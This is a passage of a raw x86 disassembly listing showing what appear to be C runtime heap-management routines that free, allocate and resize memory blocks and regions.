  40685a:	2b 79 0c             	sub    0xc(%ecx),%edi
  40685d:	83 c6 fc             	add    $0xfffffffc,%esi
  406860:	c1 ef 0f             	shr    $0xf,%edi
  406863:	8b cf                	mov    %edi,%ecx
  406865:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  40686b:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  406872:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406875:	8b 0e                	mov    (%esi),%ecx
  406877:	49                   	dec    %ecx
  406878:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40687b:	f6 c1 01             	test   $0x1,%cl
  40687e:	0f 85 d3 02 00 00    	jne    0x406b57
  406884:	53                   	push   %ebx
  406885:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  406888:	8b 13                	mov    (%ebx),%edx
  40688a:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40688d:	8b 56 fc             	mov    -0x4(%esi),%edx
  406890:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406893:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406896:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  406899:	f6 c2 01             	test   $0x1,%dl
  40689c:	75 74                	jne    0x406912
  40689e:	c1 fa 04             	sar    $0x4,%edx
  4068a1:	4a                   	dec    %edx
  4068a2:	83 fa 3f             	cmp    $0x3f,%edx
  4068a5:	76 03                	jbe    0x4068aa
  4068a7:	6a 3f                	push   $0x3f
  4068a9:	5a                   	pop    %edx
  4068aa:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4068ad:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  4068b0:	75 42                	jne    0x4068f4
  4068b2:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4068b7:	83 fa 20             	cmp    $0x20,%edx
  4068ba:	73 19                	jae    0x4068d5
  4068bc:	8b ca                	mov    %edx,%ecx
  4068be:	d3 eb                	shr    %cl,%ebx
  4068c0:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  4068c4:	f7 d3                	not    %ebx
  4068c6:	21 5c b8 44          	and    %ebx,0x44(%eax,%edi,4)
  4068ca:	fe 09                	decb   (%ecx)
  4068cc:	75 23                	jne    0x4068f1
  4068ce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4068d1:	21 19                	and    %ebx,(%ecx)
  4068d3:	eb 1c                	jmp    0x4068f1
  4068d5:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4068d8:	d3 eb                	shr    %cl,%ebx
  4068da:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  4068de:	f7 d3                	not    %ebx
  4068e0:	21 9c b8 c4 00 00 00 	and    %ebx,0xc4(%eax,%edi,4)
  4068e7:	fe 09                	decb   (%ecx)
  4068e9:	75 06                	jne    0x4068f1
  4068eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4068ee:	21 59 04             	and    %ebx,0x4(%ecx)
  4068f1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4068f4:	8b 53 08             	mov    0x8(%ebx),%edx
  4068f7:	8b 5b 04             	mov    0x4(%ebx),%ebx
  4068fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4068fd:	03 4d f4             	add    -0xc(%ebp),%ecx
  406900:	89 5a 04             	mov    %ebx,0x4(%edx)
  406903:	8b 55 0c             	mov    0xc(%ebp),%edx
  406906:	8b 5a 04             	mov    0x4(%edx),%ebx
  406909:	8b 52 08             	mov    0x8(%edx),%edx
  40690c:	89 53 08             	mov    %edx,0x8(%ebx)
  40690f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406912:	8b d1                	mov    %ecx,%edx
  406914:	c1 fa 04             	sar    $0x4,%edx
  406917:	4a                   	dec    %edx
  406918:	83 fa 3f             	cmp    $0x3f,%edx
  40691b:	76 03                	jbe    0x406920
  40691d:	6a 3f                	push   $0x3f
  40691f:	5a                   	pop    %edx
  406920:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  406923:	83 e3 01             	and    $0x1,%ebx
  406926:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406929:	0f 85 8f 00 00 00    	jne    0x4069be
  40692f:	2b 75 f8             	sub    -0x8(%ebp),%esi
  406932:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  406935:	c1 fb 04             	sar    $0x4,%ebx
  406938:	6a 3f                	push   $0x3f
  40693a:	89 75 0c             	mov    %esi,0xc(%ebp)
  40693d:	4b                   	dec    %ebx
  40693e:	5e                   	pop    %esi
  40693f:	3b de                	cmp    %esi,%ebx
  406941:	76 02                	jbe    0x406945
  406943:	8b de                	mov    %esi,%ebx
  406945:	03 4d f8             	add    -0x8(%ebp),%ecx
  406948:	8b d1                	mov    %ecx,%edx
  40694a:	c1 fa 04             	sar    $0x4,%edx
  40694d:	4a                   	dec    %edx
  40694e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406951:	3b d6                	cmp    %esi,%edx
  406953:	76 02                	jbe    0x406957
  406955:	8b d6                	mov    %esi,%edx
  406957:	3b da                	cmp    %edx,%ebx
  406959:	74 5e                	je     0x4069b9
  40695b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40695e:	8b 71 04             	mov    0x4(%ecx),%esi
  406961:	3b 71 08             	cmp    0x8(%ecx),%esi
  406964:	75 3b                	jne    0x4069a1
  406966:	be 00 00 00 80       	mov    $0x80000000,%esi
  40696b:	83 fb 20             	cmp    $0x20,%ebx
  40696e:	73 17                	jae    0x406987
  406970:	8b cb                	mov    %ebx,%ecx
  406972:	d3 ee                	shr    %cl,%esi
  406974:	f7 d6                	not    %esi
  406976:	21 74 b8 44          	and    %esi,0x44(%eax,%edi,4)
  40697a:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  40697e:	75 21                	jne    0x4069a1
  406980:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406983:	21 31                	and    %esi,(%ecx)
  406985:	eb 1a                	jmp    0x4069a1
  406987:	8d 4b e0             	lea    -0x20(%ebx),%ecx
  40698a:	d3 ee                	shr    %cl,%esi
  40698c:	f7 d6                	not    %esi
  40698e:	21 b4 b8 c4 00 00 00 	and    %esi,0xc4(%eax,%edi,4)
  406995:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  406999:	75 06                	jne    0x4069a1
  40699b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40699e:	21 71 04             	and    %esi,0x4(%ecx)
  4069a1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4069a4:	8b 71 08             	mov    0x8(%ecx),%esi
  4069a7:	8b 49 04             	mov    0x4(%ecx),%ecx
  4069aa:	89 4e 04             	mov    %ecx,0x4(%esi)
  4069ad:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4069b0:	8b 71 04             	mov    0x4(%ecx),%esi
  4069b3:	8b 49 08             	mov    0x8(%ecx),%ecx
  4069b6:	89 4e 08             	mov    %ecx,0x8(%esi)
  4069b9:	8b 75 0c             	mov    0xc(%ebp),%esi
  4069bc:	eb 03                	jmp    0x4069c1
  4069be:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4069c1:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4069c5:	75 08                	jne    0x4069cf
  4069c7:	3b da                	cmp    %edx,%ebx
  4069c9:	0f 84 80 00 00 00    	je     0x406a4f
  4069cf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4069d2:	8d 0c d1             	lea    (%ecx,%edx,8),%ecx
  4069d5:	8b 59 04             	mov    0x4(%ecx),%ebx
  4069d8:	89 4e 08             	mov    %ecx,0x8(%esi)
  4069db:	89 5e 04             	mov    %ebx,0x4(%esi)
  4069de:	89 71 04             	mov    %esi,0x4(%ecx)
  4069e1:	8b 4e 04             	mov    0x4(%esi),%ecx
  4069e4:	89 71 08             	mov    %esi,0x8(%ecx)
  4069e7:	8b 4e 04             	mov    0x4(%esi),%ecx
  4069ea:	3b 4e 08             	cmp    0x8(%esi),%ecx
  4069ed:	75 60                	jne    0x406a4f
  4069ef:	8a 4c 02 04          	mov    0x4(%edx,%eax,1),%cl
  4069f3:	88 4d 0f             	mov    %cl,0xf(%ebp)
  4069f6:	fe c1                	inc    %cl
  4069f8:	88 4c 02 04          	mov    %cl,0x4(%edx,%eax,1)
  4069fc:	83 fa 20             	cmp    $0x20,%edx
  4069ff:	73 25                	jae    0x406a26
  406a01:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406a05:	75 0e                	jne    0x406a15
  406a07:	8b ca                	mov    %edx,%ecx
  406a09:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406a0e:	d3 eb                	shr    %cl,%ebx
  406a10:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a13:	09 19                	or     %ebx,(%ecx)
  406a15:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406a1a:	8b ca                	mov    %edx,%ecx
  406a1c:	d3 eb                	shr    %cl,%ebx
  406a1e:	8d 44 b8 44          	lea    0x44(%eax,%edi,4),%eax
  406a22:	09 18                	or     %ebx,(%eax)
  406a24:	eb 29                	jmp    0x406a4f
  406a26:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406a2a:	75 10                	jne    0x406a3c
  406a2c:	8d 4a e0             	lea    -0x20(%edx),%ecx
  406a2f:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406a34:	d3 eb                	shr    %cl,%ebx
  406a36:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a39:	09 59 04             	or     %ebx,0x4(%ecx)
  406a3c:	8d 4a e0             	lea    -0x20(%edx),%ecx
  406a3f:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406a44:	d3 ea                	shr    %cl,%edx
  406a46:	8d 84 b8 c4 00 00 00 	lea    0xc4(%eax,%edi,4),%eax
  406a4d:	09 10                	or     %edx,(%eax)
  406a4f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a52:	89 06                	mov    %eax,(%esi)
  406a54:	89 44 30 fc          	mov    %eax,-0x4(%eax,%esi,1)
  406a58:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406a5b:	ff 08                	decl   (%eax)
  406a5d:	0f 85 f3 00 00 00    	jne    0x406b56
  406a63:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406a68:	85 c0                	test   %eax,%eax
  406a6a:	0f 84 d8 00 00 00    	je     0x406b48
  406a70:	8b 0d 78 e9 40 00    	mov    0x40e978,%ecx
  406a76:	8b 35 c0 a0 40 00    	mov    0x40a0c0,%esi
  406a7c:	68 00 40 00 00       	push   $0x4000
  406a81:	c1 e1 0f             	shl    $0xf,%ecx
  406a84:	03 48 0c             	add    0xc(%eax),%ecx
  406a87:	bb 00 80 00 00       	mov    $0x8000,%ebx
  406a8c:	53                   	push   %ebx
  406a8d:	51                   	push   %ecx
  406a8e:	ff d6                	call   *%esi
  406a90:	8b 0d 78 e9 40 00    	mov    0x40e978,%ecx
  406a96:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406a9b:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406aa0:	d3 ea                	shr    %cl,%edx
  406aa2:	09 50 08             	or     %edx,0x8(%eax)
  406aa5:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406aaa:	8b 40 10             	mov    0x10(%eax),%eax
  406aad:	8b 0d 78 e9 40 00    	mov    0x40e978,%ecx
  406ab3:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  406aba:	00 
  406abb:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406ac0:	8b 40 10             	mov    0x10(%eax),%eax
  406ac3:	fe 48 43             	decb   0x43(%eax)
  406ac6:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406acb:	8b 48 10             	mov    0x10(%eax),%ecx
  406ace:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  406ad2:	75 09                	jne    0x406add
  406ad4:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  406ad8:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406add:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  406ae1:	75 65                	jne    0x406b48
  406ae3:	53                   	push   %ebx
  406ae4:	6a 00                	push   $0x0
  406ae6:	ff 70 0c             	push   0xc(%eax)
  406ae9:	ff d6                	call   *%esi
  406aeb:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406af0:	ff 70 10             	push   0x10(%eax)
  406af3:	6a 00                	push   $0x0
  406af5:	ff 35 7c e3 40 00    	push   0x40e37c
  406afb:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  406b01:	8b 0d 64 e9 40 00    	mov    0x40e964,%ecx
  406b07:	a1 60 e5 40 00       	mov    0x40e560,%eax
  406b0c:	6b c9 14             	imul   $0x14,%ecx,%ecx
  406b0f:	8b 15 68 e9 40 00    	mov    0x40e968,%edx
  406b15:	2b c8                	sub    %eax,%ecx
  406b17:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  406b1b:	51                   	push   %ecx
  406b1c:	8d 48 14             	lea    0x14(%eax),%ecx
  406b1f:	51                   	push   %ecx
  406b20:	50                   	push   %eax
  406b21:	e8 4a 25 00 00       	call   0x409070
  406b26:	8b 45 08             	mov    0x8(%ebp),%eax
  406b29:	83 c4 0c             	add    $0xc,%esp
  406b2c:	ff 0d 64 e9 40 00    	decl   0x40e964
  406b32:	3b 05 60 e5 40 00    	cmp    0x40e560,%eax
  406b38:	76 04                	jbe    0x406b3e
  406b3a:	83 6d 08 14          	subl   $0x14,0x8(%ebp)
  406b3e:	a1 68 e9 40 00       	mov    0x40e968,%eax
  406b43:	a3 70 e9 40 00       	mov    %eax,0x40e970
  406b48:	8b 45 08             	mov    0x8(%ebp),%eax
  406b4b:	a3 60 e5 40 00       	mov    %eax,0x40e560
  406b50:	89 3d 78 e9 40 00    	mov    %edi,0x40e978
  406b56:	5b                   	pop    %ebx
  406b57:	5f                   	pop    %edi
  406b58:	5e                   	pop    %esi
  406b59:	c9                   	leave
  406b5a:	c3                   	ret
  406b5b:	a1 74 e9 40 00       	mov    0x40e974,%eax
  406b60:	56                   	push   %esi
  406b61:	8b 35 64 e9 40 00    	mov    0x40e964,%esi
  406b67:	57                   	push   %edi
  406b68:	33 ff                	xor    %edi,%edi
  406b6a:	3b f0                	cmp    %eax,%esi
  406b6c:	75 34                	jne    0x406ba2
  406b6e:	83 c0 10             	add    $0x10,%eax
  406b71:	6b c0 14             	imul   $0x14,%eax,%eax
  406b74:	50                   	push   %eax
  406b75:	ff 35 68 e9 40 00    	push   0x40e968
  406b7b:	57                   	push   %edi
  406b7c:	ff 35 7c e3 40 00    	push   0x40e37c
  406b82:	ff 15 0c a1 40 00    	call   *0x40a10c
  406b88:	3b c7                	cmp    %edi,%eax
  406b8a:	75 04                	jne    0x406b90
  406b8c:	33 c0                	xor    %eax,%eax
  406b8e:	eb 78                	jmp    0x406c08
  406b90:	83 05 74 e9 40 00 10 	addl   $0x10,0x40e974
  406b97:	8b 35 64 e9 40 00    	mov    0x40e964,%esi
  406b9d:	a3 68 e9 40 00       	mov    %eax,0x40e968
  406ba2:	6b f6 14             	imul   $0x14,%esi,%esi
  406ba5:	03 35 68 e9 40 00    	add    0x40e968,%esi
  406bab:	68 c4 41 00 00       	push   $0x41c4
  406bb0:	6a 08                	push   $0x8
  406bb2:	ff 35 7c e3 40 00    	push   0x40e37c
  406bb8:	ff 15 04 a1 40 00    	call   *0x40a104
  406bbe:	89 46 10             	mov    %eax,0x10(%esi)
  406bc1:	3b c7                	cmp    %edi,%eax
  406bc3:	74 c7                	je     0x406b8c
  406bc5:	6a 04                	push   $0x4
  406bc7:	68 00 20 00 00       	push   $0x2000
  406bcc:	68 00 00 10 00       	push   $0x100000
  406bd1:	57                   	push   %edi
  406bd2:	ff 15 08 a1 40 00    	call   *0x40a108
  406bd8:	89 46 0c             	mov    %eax,0xc(%esi)
  406bdb:	3b c7                	cmp    %edi,%eax
  406bdd:	75 12                	jne    0x406bf1
  406bdf:	ff 76 10             	push   0x10(%esi)
  406be2:	57                   	push   %edi
  406be3:	ff 35 7c e3 40 00    	push   0x40e37c
  406be9:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  406bef:	eb 9b                	jmp    0x406b8c
  406bf1:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  406bf5:	89 3e                	mov    %edi,(%esi)
  406bf7:	89 7e 04             	mov    %edi,0x4(%esi)
  406bfa:	ff 05 64 e9 40 00    	incl   0x40e964
  406c00:	8b 46 10             	mov    0x10(%esi),%eax
  406c03:	83 08 ff             	orl    $0xffffffff,(%eax)
  406c06:	8b c6                	mov    %esi,%eax
  406c08:	5f                   	pop    %edi
  406c09:	5e                   	pop    %esi
  406c0a:	c3                   	ret
  406c0b:	8b ff                	mov    %edi,%edi
  406c0d:	55                   	push   %ebp
  406c0e:	8b ec                	mov    %esp,%ebp
  406c10:	51                   	push   %ecx
  406c11:	51                   	push   %ecx
  406c12:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c15:	8b 41 08             	mov    0x8(%ecx),%eax
  406c18:	53                   	push   %ebx
  406c19:	56                   	push   %esi
  406c1a:	8b 71 10             	mov    0x10(%ecx),%esi
  406c1d:	57                   	push   %edi
  406c1e:	33 db                	xor    %ebx,%ebx
  406c20:	eb 03                	jmp    0x406c25
  406c22:	03 c0                	add    %eax,%eax
  406c24:	43                   	inc    %ebx
  406c25:	85 c0                	test   %eax,%eax
  406c27:	7d f9                	jge    0x406c22
  406c29:	8b c3                	mov    %ebx,%eax
  406c2b:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  406c31:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  406c38:	6a 3f                	push   $0x3f
  406c3a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406c3d:	5a                   	pop    %edx
  406c3e:	89 40 08             	mov    %eax,0x8(%eax)
  406c41:	89 40 04             	mov    %eax,0x4(%eax)
  406c44:	83 c0 08             	add    $0x8,%eax
  406c47:	4a                   	dec    %edx
  406c48:	75 f4                	jne    0x406c3e
  406c4a:	6a 04                	push   $0x4
  406c4c:	8b fb                	mov    %ebx,%edi
  406c4e:	68 00 10 00 00       	push   $0x1000
  406c53:	c1 e7 0f             	shl    $0xf,%edi
  406c56:	03 79 0c             	add    0xc(%ecx),%edi
  406c59:	68 00 80 00 00       	push   $0x8000
  406c5e:	57                   	push   %edi
  406c5f:	ff 15 08 a1 40 00    	call   *0x40a108
  406c65:	85 c0                	test   %eax,%eax
  406c67:	75 08                	jne    0x406c71
  406c69:	83 c8 ff             	or     $0xffffffff,%eax
  406c6c:	e9 9d 00 00 00       	jmp    0x406d0e
  406c71:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  406c77:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406c7a:	3b fa                	cmp    %edx,%edi
  406c7c:	77 43                	ja     0x406cc1
  406c7e:	8b ca                	mov    %edx,%ecx
  406c80:	2b cf                	sub    %edi,%ecx
  406c82:	c1 e9 0c             	shr    $0xc,%ecx
  406c85:	8d 47 10             	lea    0x10(%edi),%eax
  406c88:	41                   	inc    %ecx
  406c89:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  406c8d:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  406c94:	8d 90 fc 0f 00 00    	lea    0xffc(%eax),%edx
  406c9a:	89 10                	mov    %edx,(%eax)
  406c9c:	8d 90 fc ef ff ff    	lea    -0x1004(%eax),%edx
  406ca2:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  406ca9:	89 50 04             	mov    %edx,0x4(%eax)
  406cac:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  406cb3:	0f 00 00 
  406cb6:	05 00 10 00 00       	add    $0x1000,%eax
  406cbb:	49                   	dec    %ecx
  406cbc:	75 cb                	jne    0x406c89
  406cbe:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406cc1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406cc4:	05 f8 01 00 00       	add    $0x1f8,%eax
  406cc9:	8d 4f 0c             	lea    0xc(%edi),%ecx
  406ccc:	89 48 04             	mov    %ecx,0x4(%eax)
  406ccf:	89 41 08             	mov    %eax,0x8(%ecx)
  406cd2:	8d 4a 0c             	lea    0xc(%edx),%ecx
  406cd5:	89 48 08             	mov    %ecx,0x8(%eax)
  406cd8:	89 41 04             	mov    %eax,0x4(%ecx)
  406cdb:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  406ce0:	33 ff                	xor    %edi,%edi
  406ce2:	47                   	inc    %edi
  406ce3:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  406cea:	8a 46 43             	mov    0x43(%esi),%al
  406ced:	8a c8                	mov    %al,%cl
  406cef:	fe c1                	inc    %cl
  406cf1:	84 c0                	test   %al,%al
  406cf3:	8b 45 08             	mov    0x8(%ebp),%eax
  406cf6:	88 4e 43             	mov    %cl,0x43(%esi)
  406cf9:	75 03                	jne    0x406cfe
  406cfb:	09 78 04             	or     %edi,0x4(%eax)
  406cfe:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406d03:	8b cb                	mov    %ebx,%ecx
  406d05:	d3 ea                	shr    %cl,%edx
  406d07:	f7 d2                	not    %edx
  406d09:	21 50 08             	and    %edx,0x8(%eax)
  406d0c:	8b c3                	mov    %ebx,%eax
  406d0e:	5f                   	pop    %edi
  406d0f:	5e                   	pop    %esi
  406d10:	5b                   	pop    %ebx
  406d11:	c9                   	leave
  406d12:	c3                   	ret
  406d13:	8b ff                	mov    %edi,%edi
  406d15:	55                   	push   %ebp
  406d16:	8b ec                	mov    %esp,%ebp
  406d18:	83 ec 0c             	sub    $0xc,%esp
  406d1b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d1e:	8b 41 10             	mov    0x10(%ecx),%eax
  406d21:	53                   	push   %ebx
  406d22:	56                   	push   %esi
  406d23:	8b 75 10             	mov    0x10(%ebp),%esi
  406d26:	57                   	push   %edi
  406d27:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406d2a:	8b d7                	mov    %edi,%edx
  406d2c:	2b 51 0c             	sub    0xc(%ecx),%edx
  406d2f:	83 c6 17             	add    $0x17,%esi
  406d32:	c1 ea 0f             	shr    $0xf,%edx
  406d35:	8b ca                	mov    %edx,%ecx
  406d37:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  406d3d:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  406d44:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  406d47:	8b 4f fc             	mov    -0x4(%edi),%ecx
  406d4a:	83 e6 f0             	and    $0xfffffff0,%esi
  406d4d:	49                   	dec    %ecx
  406d4e:	3b f1                	cmp    %ecx,%esi
  406d50:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  406d54:	8b 1f                	mov    (%edi),%ebx
  406d56:	89 4d 10             	mov    %ecx,0x10(%ebp)
  406d59:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  406d5c:	0f 8e 55 01 00 00    	jle    0x406eb7
  406d62:	f6 c3 01             	test   $0x1,%bl
  406d65:	0f 85 45 01 00 00    	jne    0x406eb0
  406d6b:	03 d9                	add    %ecx,%ebx
  406d6d:	3b f3                	cmp    %ebx,%esi
  406d6f:	0f 8f 3b 01 00 00    	jg     0x406eb0
  406d75:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d78:	c1 f9 04             	sar    $0x4,%ecx
  406d7b:	49                   	dec    %ecx
  406d7c:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406d7f:	83 f9 3f             	cmp    $0x3f,%ecx
  406d82:	76 06                	jbe    0x406d8a
  406d84:	6a 3f                	push   $0x3f
  406d86:	59                   	pop    %ecx
  406d87:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406d8a:	8b 5f 04             	mov    0x4(%edi),%ebx
  406d8d:	3b 5f 08             	cmp    0x8(%edi),%ebx
  406d90:	75 43                	jne    0x406dd5
  406d92:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406d97:	83 f9 20             	cmp    $0x20,%ecx
  406d9a:	73 1a                	jae    0x406db6
  406d9c:	d3 eb                	shr    %cl,%ebx
  406d9e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406da1:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406da5:	f7 d3                	not    %ebx
  406da7:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  406dab:	fe 09                	decb   (%ecx)
  406dad:	75 26                	jne    0x406dd5
  406daf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406db2:	21 19                	and    %ebx,(%ecx)
  406db4:	eb 1f                	jmp    0x406dd5
  406db6:	83 c1 e0             	add    $0xffffffe0,%ecx
  406db9:	d3 eb                	shr    %cl,%ebx
  406dbb:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406dbe:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406dc2:	f7 d3                	not    %ebx
  406dc4:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  406dcb:	fe 09                	decb   (%ecx)
  406dcd:	75 06                	jne    0x406dd5
  406dcf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406dd2:	21 59 04             	and    %ebx,0x4(%ecx)
  406dd5:	8b 4f 08             	mov    0x8(%edi),%ecx
  406dd8:	8b 5f 04             	mov    0x4(%edi),%ebx
  406ddb:	89 59 04             	mov    %ebx,0x4(%ecx)
  406dde:	8b 4f 04             	mov    0x4(%edi),%ecx
  406de1:	8b 7f 08             	mov    0x8(%edi),%edi
  406de4:	89 79 08             	mov    %edi,0x8(%ecx)
  406de7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406dea:	2b ce                	sub    %esi,%ecx
  406dec:	01 4d fc             	add    %ecx,-0x4(%ebp)
  406def:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406df3:	0f 8e a5 00 00 00    	jle    0x406e9e
  406df9:	8b 7d fc             	mov    -0x4(%ebp),%edi
  406dfc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406dff:	c1 ff 04             	sar    $0x4,%edi
  406e02:	4f                   	dec    %edi
  406e03:	8d 4c 31 fc          	lea    -0x4(%ecx,%esi,1),%ecx
  406e07:	83 ff 3f             	cmp    $0x3f,%edi
  406e0a:	76 03                	jbe    0x406e0f
  406e0c:	6a 3f                	push   $0x3f
  406e0e:	5f                   	pop    %edi
  406e0f:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  406e12:	8d 1c fb             	lea    (%ebx,%edi,8),%ebx
  406e15:	89 5d 10             	mov    %ebx,0x10(%ebp)
  406e18:	8b 5b 04             	mov    0x4(%ebx),%ebx
  406e1b:	89 59 04             	mov    %ebx,0x4(%ecx)
  406e1e:	8b 5d 10             	mov    0x10(%ebp),%ebx
  406e21:	89 59 08             	mov    %ebx,0x8(%ecx)
  406e24:	89 4b 04             	mov    %ecx,0x4(%ebx)
  406e27:	8b 59 04             	mov    0x4(%ecx),%ebx
  406e2a:	89 4b 08             	mov    %ecx,0x8(%ebx)
  406e2d:	8b 59 04             	mov    0x4(%ecx),%ebx
  406e30:	3b 59 08             	cmp    0x8(%ecx),%ebx
  406e33:	75 57                	jne    0x406e8c
  406e35:	8a 4c 07 04          	mov    0x4(%edi,%eax,1),%cl
  406e39:	88 4d 13             	mov    %cl,0x13(%ebp)
  406e3c:	fe c1                	inc    %cl
  406e3e:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  406e42:	83 ff 20             	cmp    $0x20,%edi
  406e45:	73 1c                	jae    0x406e63
  406e47:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  406e4b:	75 0e                	jne    0x406e5b
  406e4d:	8b cf                	mov    %edi,%ecx
  406e4f:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406e54:	d3 eb                	shr    %cl,%ebx
  406e56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406e59:	09 19                	or     %ebx,(%ecx)
  406e5b:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  406e5f:	8b cf                	mov    %edi,%ecx
  406e61:	eb 20                	jmp    0x406e83
  406e63:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  406e67:	75 10                	jne    0x406e79
  406e69:	8d 4f e0             	lea    -0x20(%edi),%ecx
  406e6c:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406e71:	d3 eb                	shr    %cl,%ebx
  406e73:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406e76:	09 59 04             	or     %ebx,0x4(%ecx)
  406e79:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  406e80:	8d 4f e0             	lea    -0x20(%edi),%ecx
  406e83:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406e88:	d3 ea                	shr    %cl,%edx
  406e8a:	09 10                	or     %edx,(%eax)
  406e8c:	8b 55 0c             	mov    0xc(%ebp),%edx
  406e8f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406e92:	8d 44 32 fc          	lea    -0x4(%edx,%esi,1),%eax
  406e96:	89 08                	mov    %ecx,(%eax)
  406e98:	89 4c 01 fc          	mov    %ecx,-0x4(%ecx,%eax,1)
  406e9c:	eb 03                	jmp    0x406ea1
  406e9e:	8b 55 0c             	mov    0xc(%ebp),%edx
  406ea1:	8d 46 01             	lea    0x1(%esi),%eax
